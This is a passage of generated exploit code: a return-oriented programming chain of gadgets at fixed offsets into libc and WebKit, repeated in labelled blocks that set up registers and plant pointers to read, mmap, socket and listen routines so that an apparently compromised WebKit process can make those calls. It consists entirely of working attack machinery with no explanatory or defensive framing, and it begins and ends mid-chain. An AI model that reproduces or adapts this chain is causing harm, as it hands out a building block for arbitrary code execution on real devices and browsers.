db([0, 0]); // 0x0
//L3347:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
read_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+219296, //L3485
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L3485:
db([0, 0]); // 0x0
//L2983:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
mmap_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+220624, //L3486
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L3486:
db([0, 0]); // 0x0
//L3175:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
socket_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+221952, //L3487
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L3487:
db([0, 0]); // 0x0
//L3249:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+11, //nop
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+489696, //pop rsp
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+149872, //mov rax, [rdi]
libc_base+713278 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+772328 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5236215, //and rax, rcx
libc_base+772328, //pop rcx
listen_addr,
webkit_base+2989859, //mov [rax], rcx
libc_base+713278 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+740138, //mov rax, r8
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+388400, //mov rax, rdi
libc_base+713278, //pop rsi
ropchain+223280, //L3488
webkit_base+4687784, //mov [rsi], rax ; mov al, 1
libc_base+489696 //pop rsp
]);
//L3488:
db([0, 0]); // 0x0
//L3233:
set_gadget(libc_base+713278,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+165442, //pop rdi
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+713278, //pop rsi
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+608613, //pop rdx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+772328, //pop rcx
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+1420514, //pop r8
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
webkit_base+17972187, //pop r9
libc_base+430587, //mov [rdi], rax
libc_base+207036, //sub rdi, rsi ; mov rdx, rdi
libc_base+768796, //pop rax
libc_base+765305, //xor rax, rax
libc_base+430587, //mov [rdi], rax
libc_base+713278 //pop rsi
]);
